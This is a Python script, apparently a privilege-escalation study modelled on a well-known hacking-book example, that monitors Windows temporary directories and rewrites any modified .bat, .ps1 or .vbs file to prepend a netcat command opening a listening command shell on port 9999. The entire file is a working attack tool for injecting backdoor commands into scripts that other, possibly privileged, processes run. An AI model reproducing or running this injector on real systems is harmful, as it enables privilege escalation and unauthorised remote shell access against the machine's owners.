import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

NETCAT = 'C:\\Users\\User\\Documents\\GitHub\\Ethical-Python-Tools\\Escalation-Studies\\netcat.exe'
TGT_IP = '192.168.1.185'
cmd = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'

FILE_LIST_DIRECTORY = 0x0001
PATHS = ['c:\\WINDOWS\\Temp',tempfile.gettempdir()]#Define our list of directories

FILE_TYPES = {                                     #Dictionary of focused extensions 
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{cmd}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{cmd}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n",
    f'\r\nCreateObject("Wscript.Shell").Run("{cmd}")\r\n'],
    }

def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:#inject code function handles code injection and file marker checks
        return
    full_contents = FILE_TYPES[extension][0]        #Write the marker and code to target to run
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')

def monitor(path_to_watch):                 #Acquire a handle to our necessary directory through h_directory
    h_directory = win32file.CreateFile(path_to_watch, FILE_LIST_DIRECTORY, win32con.FILE_SHARE_READ|win32con.FILE_SHARE_WRITE|win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, win32con.FILE_FLAG_BACKUP_SEMANTICS,None)
    while True:
        try:                                #Notice of any file changes in directory
            results = win32file.ReadDirectoryChangesW(h_directory, 1024, True, win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES|win32con.FILE_NOTIFY_CHANGE_DIR_NAME|win32con.FILE_NOTIFY_CHANGE_FILE_NAME|win32con.FILE_NOTIFY_CHANGE_LAST_WRITE|win32con.FILE_NOTIFY_CHANGE_SECURITY|win32con.FILE_NOTIFY_CHANGE_SIZE,None,None)
            for action, file_name in results:#Recieve file name and action which took place and print information to screen
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created: {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[+] Deleted: {full_filename}')
                elif action == FILE_MODIFIED:
                    print(f'[+] Modified: {full_filename}')
                    extension = os.path.splitext(full_filename)[1]#Split file extension and check against dictionary
                    if extension in FILE_TYPES:
                        print(f'[*] Modified {full_filename}')
                        print('[vvv] Dumping contents ... ')

                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                                # NEW CODE
                                inject_code(full_filename, contents, extension)
                                print("here!")
                                print(contents)
                                print('[^^^] Dump complete.')
                        except Exception as e:
                                print(f'[!!!] Dump failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')

        except Exception as e:
            print('[!>] Error Occurred: {}'.format(e))
            pass

if __name__ == '__main__':
    print() #Solution for file not starting
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()